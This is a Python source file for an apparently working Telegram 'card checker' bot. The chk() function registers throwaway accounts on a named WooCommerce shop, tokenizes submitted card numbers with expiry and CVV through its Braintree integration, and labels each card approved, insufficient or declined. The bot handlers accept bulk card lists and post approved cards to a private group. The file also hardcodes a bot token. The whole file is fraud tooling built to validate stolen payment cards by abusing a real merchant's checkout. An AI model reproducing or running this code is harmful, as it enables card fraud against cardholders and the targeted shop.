from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import re
import time  # Add this import if not already present

def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def chk(card):
    import requests, re, base64, random, string, user_agent, time
    from requests_toolbelt.multipart.encoder import MultipartEncoder
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    import requests, pycountry
    from typing import Dict

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    def get_bin_info(bin_number: str) -> Dict:
        try:
            headers = {
                'Accept': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            # Try binlist.net first
            r = requests.get(f'https://lookup.binlist.net/{bin_number}', headers=headers, timeout=5)
            if r.status_code == 200:
                data = r.json()
                country_code = data.get('country', {}).get('alpha2', '')
                country_name = data.get('country', {}).get('name', 'Unknown')
                flag = ''.join(chr(ord(c.upper()) + 127397) for c in country_code) if country_code else '🏳️'
                return {
                    'bank': data.get('bank', {}).get('name', 'Unknown'),
                    'type': data.get('type', '').upper(),
                    'scheme': data.get('scheme', '').upper(),
                    'country': country_name,
                    'flag': flag
                }
            
            # Try bintable.com as fallback
            r = requests.get(f'https://bintable.com/api/v1/{bin_number}', headers=headers, timeout=5)
            if r.status_code == 200:
                data = r.json()
                country_code = data.get('country', {}).get('code', '')
                country_name = data.get('country', {}).get('name', 'Unknown')
                flag = ''.join(chr(ord(c.upper()) + 127397) for c in country_code) if country_code else '🏳️'
                return {
                    'bank': data.get('bank', 'Unknown'),
                    'type': data.get('type', '').upper(),
                    'scheme': data.get('scheme', '').upper(),
                    'country': country_name,
                    'flag': flag
                }
                
            # Try bins.su API as final fallback
            r = requests.get(f'https://bins.su/search?action=searchbins&bins={bin_number}&bank=&country=', headers=headers, timeout=5)
            if r.status_code == 200:
                data = r.json()
                if data and len(data) > 0:
                    bin_data = data[0]
                    country_code = bin_data.get('country_code', '')
                    country_name = bin_data.get('country', 'Unknown')
                    flag = ''.join(chr(ord(c.upper()) + 127397) for c in country_code) if country_code else '🏳️'
                    return {
                        'bank': bin_data.get('bank', 'Unknown'),
                        'type': bin_data.get('type', '').upper(),
                        'scheme': bin_data.get('brand', '').upper(),
                        'country': country_name,
                        'flag': flag
                    }
        except:
            pass
            
        # Return default values if all APIs fail
        return {
            'bank': 'Unknown',
            'type': 'Unknown',
            'scheme': 'Unknown',
            'country': 'Unknown',
            'flag': '🏳️'
        }

    card = card.strip()
    parts = re.split('[|/:]', card)
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]

    if "20" in yy:
        yy = yy.split("20")[1]

    r = requests.session()
    user = user_agent.generate_user_agent()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': user,
    }

    response = r.get('https://temp-mail.random-gen.com/', headers=headers)

    acc = re.search(
        r'&quot;params&quot;:\[&quot;(.*?)&quot;\]',
        response.text).group(1)

    headers = {
        'authority': 'stephanieriseley.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://stephanieriseley.com/my-account/edit-account/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    response = r.get('https://stephanieriseley.com/my-account/', headers=headers)

    nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

    headers = {
        'authority': 'stephanieriseley.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://stephanieriseley.com',
        'pragma': 'no-cache',
        'referer': 'https://stephanieriseley.com/my-account/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'email': acc,
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://stephanieriseley.com/my-account/add-payment-method/',
        'wc_order_attribution_session_start_time': '2025-01-30 11:27:21',
        'wc_order_attribution_session_pages': '5',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'woocommerce-register-nonce': nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }

    response = r.post('https://stephanieriseley.com/my-account/', headers=headers, data=data)

    headers = {
        'authority': 'stephanieriseley.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://stephanieriseley.com/my-account/edit-address/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    response = r.get('https://stephanieriseley.com/my-account/edit-address/billing/', headers=headers)

    address = (re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1))

    headers = {
        'authority': 'stephanieriseley.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://stephanieriseley.com',
        'pragma': 'no-cache',
        'referer': 'https://stephanieriseley.com/my-account/edit-address/billing/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'billing_first_name': 'bbxbcbb',
        'billing_last_name': 'hhxbfbb',
        'billing_company': '',
        'billing_country': 'US',
        'billing_address_1': 'hhfhfbfv',
        'billing_address_2': 'hbdbfv',
        'billing_city': 'hfhdvvxv',
        'billing_state': 'NY',
        'billing_postcode': '10080',
        'billing_phone': '2153652415',
        'billing_email': 'moh5527vbnm@gmail.com',
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': address,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
    }

    response = r.post(
        'https://stephanieriseley.com/my-account/edit-address/billing/',
        headers=headers,
        data=data,
    )

    headers = {
        'authority': 'stephanieriseley.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://stephanieriseley.com/my-account/payment-methods/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    response = r.get('https://stephanieriseley.com/my-account/add-payment-method/', headers=headers)

    client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)

    add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)

    headers = {
        'authority': 'stephanieriseley.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://stephanieriseley.com',
        'pragma': 'no-cache',
        'referer': 'https://stephanieriseley.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client_token_nonce,
    }

    response = r.post('https://stephanieriseley.com/wp-admin/admin-ajax.php', headers=headers, data=data)

    encoded_text = response.json()['data']

    decoded_text = base64.b64decode(encoded_text).decode('utf-8')

    au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)[0]

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '30fa915c-7be3-4d80-ab67-621209fcfaa7',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

    tok = response.json()['data']['tokenizeCreditCard']['token']

    headers = {
        'authority': 'stephanieriseley.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://stephanieriseley.com',
        'pragma': 'no-cache',
        'referer': 'https://stephanieriseley.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data = [
        ('payment_method', 'braintree_credit_card'),
        ('wc-braintree-credit-card-card-type', 'visa'),
        ('wc-braintree-credit-card-3d-secure-enabled', ''),
        ('wc-braintree-credit-card-3d-secure-verified', ''),
        ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
        ('wc_braintree_credit_card_payment_nonce', tok,),
        ('wc_braintree_device_data', '{"correlation_id":"dde461f8f7986dc3e1fd65f2375a4e69"}'),
        ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
        ('wc_braintree_paypal_payment_nonce', ''),
        ('wc_braintree_device_data', '{"correlation_id":"dde461f8f7986dc3e1fd65f2375a4e69"}'),
        ('wc-braintree-paypal-context', 'shortcode'),
        ('wc_braintree_paypal_amount', '0.00'),
        ('wc_braintree_paypal_currency', 'USD'),
        ('wc_braintree_paypal_locale', 'en_us'),
        ('wc-braintree-paypal-tokenize-payment-method', 'true'),
        ('woocommerce-add-payment-method-nonce', add_nonce,),
        ('_wp_http_referer', '/my-account/add-payment-method/'),
        ('woocommerce_add_payment_method', '1'),
    ]

    response = r.post(
        'https://stephanieriseley.com/my-account/add-payment-method/',
        headers=headers,
        data=data,
    )

    text = response.text
    pattern = r'Status code (.*?)\s*</li>'

    match = re.search(pattern, text)
    bin_info = get_bin_info(n[:6])

    if match:
        raw_result = match.group(1)
        base_message = raw_result.split('(')[0]
        base_message = re.sub(r'^\d+:\s*', '', base_message)
        response_msg = base_message.strip()

        if 'risk_threshold' in text:
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        elif 'insufficient' in text.lower() or 'funds' in text.lower():
            status = "𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬 🟡"
        elif '81724' in text or 'Duplicate card' in text or 'Nice! New payment method added' in text:
            status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
        else:
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    else:
        if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
            status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            response_msg = "Successfully Added"
        else:
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            response_msg = "Card Declined"

    return f"""{status}

💳 𝗖𝗮𝗿𝗱 ➜ {card}
➤ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ Braintree Auth
[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_msg}

[ϟ] 𝗜𝗻𝗳𝗼 ➜ {bin_info['scheme']} - {bin_info['type']}
[ϟ] 𝐁𝐚𝐧𝐤 ➜ {bin_info['bank']}
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {bin_info['country']} {bin_info['flag']}
[ϟ] Bot by @AmrElwany"""


# Add new imports at the top
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import re

# Initialize bot
bot = TeleBot('7822681496:AAHv-QmBxfacq6qB1PHYRzFdNqR0TP_ugLk')

# Replace the existing card_pattern with this more comprehensive one
card_pattern = r'\d{15,16}[\|\/](?:0[1-9]|1[0-2])(?:[\|\/](?:20)?[2-9]\d|\/?(?:20)?[2-9]\d)[\|\/]\d{3,4}'

# This pattern matches:
# - cc|mm|yyyy|cvv   (377965530228849|02|2028|3321)
# - cc|mm|yy|cvv     (377965530228849|02|28|3321)
# - cc|mm/yyyy|cvv   (377965530228849|02/2028|3321)
# - cc|mm/yy|cvv     (377965530228849|02/28|3321)
# - All above formats with either 3 or 4 digit CVV

# Add these global counters
class Counter:
    def __init__(self, message_id):
        self.message_id = message_id
        self.approved = 0
        self.dead = 0
        self.insufficient = 0
        self.total = 0
        self.should_stop = False

# Add this after the Counter class
active_checks = {}  # Dictionary to store active checks

def create_status_keyboard(message_id):
    keyboard = InlineKeyboardMarkup()
    stop_button = InlineKeyboardButton(text="⛔️ Stop Checking", callback_data=f"stop_{message_id}")
    keyboard.add(stop_button)
    return keyboard

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_callback(call):
    message_id = call.data.split("_")[1]
    for counter in active_checks.values():
        if str(counter.message_id) == message_id:
            counter.should_stop = True
            bot.answer_callback_query(call.id, "✅ Checking will stop after current card")
            bot.edit_message_text(
                f"🛑 Checking stopped!\n"
                f"Approved ✅ : {counter.approved}\n"
                f"Dead ❌ : {counter.dead}\n" 
                f"Insufficient 🟡 : {counter.insufficient}\n"
                f"Total 🔵: {counter.total}",
                call.message.chat.id,
                call.message.message_id
            )
            break

# Add after imports
ALLOWED_USER_IDS = [5602775702, 1264607403]
ALLOWED_GROUP_ID = -1002256921476  # Add this line

def check_user_permission(message):
    # In private chat, only allow specific users
    if message.chat.type == 'private':
        if message.from_user.id not in ALLOWED_USER_IDS:
            bot.reply_to(message, "⚠️ عذراً، هذا البوت متاح فقط في المجموعة المخصصة أو للمستخدم المصرح له.")
            return False
        return True
        
    # In groups, only allow the specific group
    if message.chat.type in ['group', 'supergroup']:
        if message.chat.id != ALLOWED_GROUP_ID:
            bot.reply_to(message, "⚠️ عذراً، هذا البوت يعمل فقط في المجموعة المخصصة.")
            return False
        return True
        
    # Deny all other chat types
    bot.reply_to(message, "⚠️ عذراً، هذا البوت يعمل فقط في المجموعة المخصصة.")
    return False

# Modify file handler
@bot.message_handler(content_types=['document'])
def handle_file(message):
    if not check_user_permission(message):
        return
    try:
        counter = Counter(message.message_id)
        active_checks[message.message_id] = counter
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        cards = downloaded_file.decode('utf-8').strip().split('\n')
        
        status_msg = bot.reply_to(
            message,
            f"⌛️ Processing cards...\n"
            f"Approved ✅ : {counter.approved}\n"
            f"Dead ❌ : {counter.dead}\n"
            f"Insufficient 🟡 : {counter.insufficient}\n"
            f"Total 🔵: {counter.total}\n"
            f"Current Card 💳 : Waiting...",
            reply_markup=create_status_keyboard(message.message_id)
        )
        
        # Attach counter to message for callback reference
        status_msg.counter = counter
        
        approved_results = []
        insufficient_results = []
        do_not_honor_results = []

        for card in cards:
            if counter.should_stop:
                bot.edit_message_text(
                    f"🛑 Checking stopped!\n"
                    f"Approved ✅ : {counter.approved}\n"
                    f"Dead ❌ : {counter.dead}\n"
                    f"Insufficient 🟡 : {counter.insufficient}\n"
                    f"Total 🔵: {counter.total}",
                    status_msg.chat.id,
                    status_msg.message_id
                )
                del active_checks[message.message_id]  # Clean up
                return  # Exit immediately

            if re.match(card_pattern, card.strip()):
                counter.total += 1
                try:
                    # Add sleep before checking each card
                    time.sleep(20)  # Changed from 5 to 20
                    result = chk(card.strip())
                    
                    # Extract response message from result
                    response_line = next((line for line in result.splitlines() if '[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜' in line), '')
                    response_msg = response_line.split('➜')[-1].strip() if response_line else 'Processing...'
                    
                    # Update status with current card being checked
                    status_text = (
                        f"⌛️ Processing cards...\n"
                        f"Approved ✅ : {counter.approved}\n"
                        f"Dead ❌ : {counter.dead}\n"
                        f"Insufficient 🟡 : {counter.insufficient}\n"
                        f"Total 🔵: {counter.total}\n"
                        f"Current Card 💳 : {card}\n"
                        f"[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_msg}"
                    )
                    
                    if not counter.should_stop:
                        bot.edit_message_text(
                            status_text,
                            status_msg.chat.id,
                            status_msg.message_id,
                            reply_markup=create_status_keyboard(message.message_id)
                        )
                        
                        if "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" in result:
                            counter.approved += 1
                            approved_results.append(result)
                            bot.send_message(message.chat.id, f"✅ Approved Card Found!\n{result}")
                        elif "𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬" in result:
                            counter.insufficient += 1
                            insufficient_results.append(result)
                        elif "Do Not Honor" in result:
                            counter.dead += 1
                            do_not_honor_results.append(result)
                        else:
                            counter.dead += 1
                    else:
                        # If stopped, just update counters without sending messages
                        if "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" in result:
                            counter.approved += 1
                        elif "𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬" in result:
                            counter.insufficient += 1
                        else:
                            counter.dead += 1
                        
                    # Update status only if not stopped
                    if not counter.should_stop:
                        status_text = (
                            f"⌛️ Processing cards...\n"
                            f"Approved ✅ : {counter.approved}\n"
                            f"Dead ❌ : {counter.dead}\n"
                            f"Insufficient 🟡 : {counter.insufficient}\n"
                            f"Total 🔵: {counter.total}\n"
                            f"Current Card 💳 : {card}\n"
                            f"[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_msg}"
                        )
                        bot.edit_message_text(
                            status_text,
                            status_msg.chat.id,
                            status_msg.message_id,
                            reply_markup=create_status_keyboard(message.message_id)
                        )
                except Exception as e:
                    if not counter.should_stop:
                        counter.dead += 1
                        # Show error in status
                        status_text = (
                            f"⌛️ Processing cards...\n"
                            f"Approved ✅ : {counter.approved}\n"
                            f"Dead ❌ : {counter.dead}\n"
                            f"Insufficient 🟡 : {counter.insufficient}\n"
                            f"Total 🔵: {counter.total}\n"
                            f"Current Card 💳 : {card}\n"
                            f"[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ Error checking card"
                        )
                        bot.edit_message_text(
                            status_text,
                            status_msg.chat.id,
                            status_msg.message_id,
                            reply_markup=create_status_keyboard(message.message_id)
                        )
                    continue

            # Exit loop if stopped
            if counter.should_stop:
                return

        # Only send summary if not stopped
        if not counter.should_stop:
            # Send final status
            final_status = (
                f"✅ Check Complete!\n"
                f"Approved ✅ : {counter.approved}\n"
                f"Dead ❌ : {counter.dead}\n"
                f"Insufficient 🟡 : {counter.insufficient}\n"
                f"Total 🔵: {counter.total}"
            )
            bot.edit_message_text(final_status, status_msg.chat.id, status_msg.message_id)
            
            # Send summary of results if any exist
            if approved_results:
                bot.send_message(message.chat.id, "💳 Approved Cards Summary:")
                for result in approved_results:
                    bot.send_message(message.chat.id, result)
                    
            if insufficient_results:
                bot.send_message(message.chat.id, "🟡 Insufficient Funds Cards Summary:")
                for result in insufficient_results:
                    bot.send_message(message.chat.id, result)
                
    except Exception as e:
        if message.message_id in active_checks:
            del active_checks[message.message_id]
        bot.reply_to(message, f"Error processing file: {str(e)}")

# Add new group file check handler
@bot.message_handler(commands=['chk'])
def handle_group_file_check(message):
    if not check_user_permission(message):
        return
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "Please reply to a file with /chk command")
        return
        
    try:
        counter = Counter(message.message_id)
        active_checks[message.message_id] = counter
        
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        cards = downloaded_file.decode('utf-8').strip().split('\n')
        
        status_msg = bot.reply_to(
            message,
            f"⌛️ Processing cards...\n"
            f"Approved ✅ : {counter.approved}\n"
            f"Dead ❌ : {counter.dead}\n"
            f"Insufficient 🟡 : {counter.insufficient}\n"
            f"Total 🔵: {counter.total}\n"
            f"Current Card 💳 : Waiting...",
            reply_markup=create_status_keyboard(message.message_id)
        )
        
        # Attach counter to message for callback reference
        status_msg.counter = counter
        
        approved_results = []
        insufficient_results = []
        do_not_honor_results = []

        for card in cards:
            if counter.should_stop:
                bot.edit_message_text(
                    f"🛑 Checking stopped!\n"
                    f"Approved ✅ : {counter.approved}\n"
                    f"Dead ❌ : {counter.dead}\n"
                    f"Insufficient 🟡 : {counter.insufficient}\n"
                    f"Total 🔵: {counter.total}",
                    status_msg.chat.id,
                    status_msg.message_id
                )
                del active_checks[message.message_id]  # Clean up
                return  # Exit immediately

            if re.match(card_pattern, card.strip()):
                counter.total += 1
                try:
                    # Add sleep before checking each card
                    time.sleep(20)  # Changed from 5 to 20
                    result = chk(card.strip())
                    
                    # Extract response message from result
                    response_line = next((line for line in result.splitlines() if '[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜' in line), '')
                    response_msg = response_line.split('➜')[-1].strip() if response_line else 'Processing...'
                    
                    # Update status with current card being checked
                    status_text = (
                        f"⌛️ Processing cards...\n"
                        f"Approved ✅ : {counter.approved}\n"
                        f"Dead ❌ : {counter.dead}\n"
                        f"Insufficient 🟡 : {counter.insufficient}\n"
                        f"Total 🔵: {counter.total}\n"
                        f"Current Card 💳 : {card}\n"
                        f"[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_msg}"
                    )
                    
                    if not counter.should_stop:
                        bot.edit_message_text(
                            status_text,
                            status_msg.chat.id,
                            status_msg.message_id,
                            reply_markup=create_status_keyboard(message.message_id)
                        )
                        
                        if "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" in result:
                            counter.approved += 1
                            approved_results.append(result)
                            bot.send_message(message.chat.id, f"✅ Approved Card Found!\n{result}")
                        elif "𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬" in result:
                            counter.insufficient += 1
                            insufficient_results.append(result)
                        elif "Do Not Honor" in result:
                            counter.dead += 1
                            do_not_honor_results.append(result)
                        else:
                            counter.dead += 1
                    else:
                        # If stopped, just update counters without sending messages
                        if "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" in result:
                            counter.approved += 1
                        elif "𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐅𝐮𝐧𝐝𝐬" in result:
                            counter.insufficient += 1
                        else:
                            counter.dead += 1
                        
                    # Update status only if not stopped
                    if not counter.should_stop:
                        status_text = (
                            f"⌛️ Processing cards...\n"
                            f"Approved ✅ : {counter.approved}\n"
                            f"Dead ❌ : {counter.dead}\n"
                            f"Insufficient 🟡 : {counter.insufficient}\n"
                            f"Total 🔵: {counter.total}\n"
                            f"Current Card 💳 : {card}\n"
                            f"[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_msg}"
                        )
                        bot.edit_message_text(
                            status_text,
                            status_msg.chat.id,
                            status_msg.message_id,
                            reply_markup=create_status_keyboard(message.message_id)
                        )
                except Exception as e:
                    if not counter.should_stop:
                        counter.dead += 1
                        # Show error in status
                        status_text = (
                            f"⌛️ Processing cards...\n"
                            f"Approved ✅ : {counter.approved}\n"
                            f"Dead ❌ : {counter.dead}\n"
                            f"Insufficient 🟡 : {counter.insufficient}\n"
                            f"Total 🔵: {counter.total}\n"
                            f"Current Card 💳 : {card}\n"
                            f"[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ Error checking card"
                        )
                        bot.edit_message_text(
                            status_text,
                            status_msg.chat.id,
                            status_msg.message_id,
                            reply_markup=create_status_keyboard(message.message_id)
                        )
                    continue

            # Exit loop if stopped
            if counter.should_stop:
                return

        # Only send summary if not stopped
        if not counter.should_stop:
            # Send final status
            final_status = (
                f"✅ Check Complete!\n"
                f"Approved ✅ : {counter.approved}\n"
                f"Dead ❌ : {counter.dead}\n"
                f"Insufficient 🟡 : {counter.insufficient}\n"
                f"Total 🔵: {counter.total}"
            )
            bot.edit_message_text(final_status, status_msg.chat.id, status_msg.message_id)
            
            # Send summary of results if any exist
